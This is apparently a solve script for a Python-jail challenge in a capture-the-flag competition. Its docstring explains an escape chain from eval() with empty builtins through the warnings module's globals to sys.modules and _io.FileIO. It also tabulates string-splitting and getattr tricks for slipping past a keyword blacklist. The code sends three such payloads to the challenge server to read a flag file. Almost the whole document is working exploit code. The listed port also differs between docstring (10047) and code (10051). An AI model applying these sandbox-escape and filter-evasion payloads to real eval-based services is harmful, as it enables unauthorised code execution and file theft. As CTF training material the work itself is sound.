#!/usr/bin/env python3
"""
Solution script for CyberDune CTF 2026 - SafeCalc v1 (PyJail)
Challenge: nc challs.ctf-cyberdune.online 10047
Flag format: CYBERDUNE{...}

=== Vulnerability ===
eval() with empty builtins BUT 'warnings' module loaded globally on the server.

=== Escape Chain ===
1. Find warnings classes dynamically:
   [c for c in note.__class__.__mro__[1].__subclasses__()
    if c.__module__=='warnings'][1]
   -> This gives warnings.catch_warnings (index [1] in the warnings-module list)
   
2. Access warnings module globals:
   ..__init__.__globals__
   -> Contains 'sys' key (warnings imports sys internally)

3. Read flag file via _io.FileIO (no 'open' keyword needed):
   B['sys'].modules['_io'].FileIO('/f'+'lag.txt')
   
4. Call .read() via getattr to avoid 'read' keyword:
   B['sys'].modules['builtins'].__dict__['getattr'](fileobj, 'r'+'ead')()

=== Blacklist Bypasses ===
  Blocked word  | Bypass technique
  ------------- | -----------------------------------------------
  'cat'         | Search by __module__=='warnings' (not by name)
  'flag'        | Split string: '/f'+'lag.txt'
  'read'        | getattr(f, 'r'+'ead')()
  'open'        | Use _io.FileIO instead of open()
  'os'          | Not needed; use _io and builtins directly
  All others    | Not triggered by this payload
"""
import socket
import re

HOST = "challs.ctf-cyberdune.online"
PORT = 10051

# ── Final payload (224 chars, well under 350 limit) ──────────────────────────
PAYLOAD = (
    "(B:=[c for c in note.__class__.__mro__[1].__subclasses__()"
    " if c.__module__=='warnings'][1].__init__.__globals__)"
    "and B['sys'].modules['builtins'].__dict__['getattr']"
    "(B['sys'].modules['_io'].FileIO('/f'+'lag.txt'),'r'+'ead')()"
)

# Fallback: try index [0] (WarningMessage) in case server has fewer classes
PAYLOAD_FB = (
    "(B:=[c for c in note.__class__.__mro__[1].__subclasses__()"
    " if c.__module__=='warnings'][0].__init__.__globals__)"
    "and B.get('sys') and B['sys'].modules['builtins'].__dict__['getattr']"
    "(B['sys'].modules['_io'].FileIO('/f'+'lag.txt'),'r'+'ead')()"
)

# Second fallback: /flag (no .txt)
PAYLOAD_FB2 = (
    "(B:=[c for c in note.__class__.__mro__[1].__subclasses__()"
    " if c.__module__=='warnings'][1].__init__.__globals__)"
    "and B['sys'].modules['builtins'].__dict__['getattr']"
    "(B['sys'].modules['_io'].FileIO('/f'+'lag'),'r'+'ead')()"
)


def verify_payload(payload, name="payload"):
    BLACKLIST = ["import","open","exec","eval","os","system","subprocess","flag","cat","read"]
    low = payload.lower()
    for bad in BLACKLIST:
        if bad in low:
            print(f"[WARN] {name}: contains blocked word '{bad}'!")
            return False
    if len(payload) > 350:
        print(f"[WARN] {name}: too long ({len(payload)} chars)!")
        return False
    print(f"[OK] {name}: clean ({len(payload)} chars)")
    return True


def recv_until(s, marker=b">>> "):
    data = b""
    while not data.endswith(marker):
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data.decode(errors="replace")


def extract_flag(text):
    m = re.search(r"CYBERDUNE\{[^}]+\}", text)
    if m:
        return m.group()
    # Also try generic flag patterns in the response bytes repr
    m2 = re.search(r"b'([^']*CYBERDUNE[^']*)'", text)
    if m2:
        return m2.group(1)
    return None


def solve():
    print("[INFO] Verifying payloads...")
    verify_payload(PAYLOAD, "PAYLOAD (main)")
    verify_payload(PAYLOAD_FB, "PAYLOAD_FB (fallback idx 0)")
    verify_payload(PAYLOAD_FB2, "PAYLOAD_FB2 (fallback /flag)")
    print()

    payloads = [PAYLOAD, PAYLOAD_FB, PAYLOAD_FB2]

    with socket.create_connection((HOST, PORT), timeout=20) as s:
        # Read banner + first prompt
        banner = recv_until(s)
        print("[BANNER]")
        print(banner)

        for i, pld in enumerate(payloads):
            print(f"[SEND #{i+1}] {pld}")
            s.sendall((pld + "\n").encode())
            resp = recv_until(s)
            print(f"[RECV #{i+1}] {resp.strip()}")

            flag = extract_flag(resp)
            if flag:
                print()
                print("=" * 60)
                print(f"  FLAG: {flag}")
                print("=" * 60)
                return flag

            # If "No more tries" we're out
            if "No more tries" in resp:
                print("[INFO] Out of tries.")
                break

    print("[FAIL] Could not extract flag. Check output above.")
    return None


if __name__ == "__main__":
    solve()
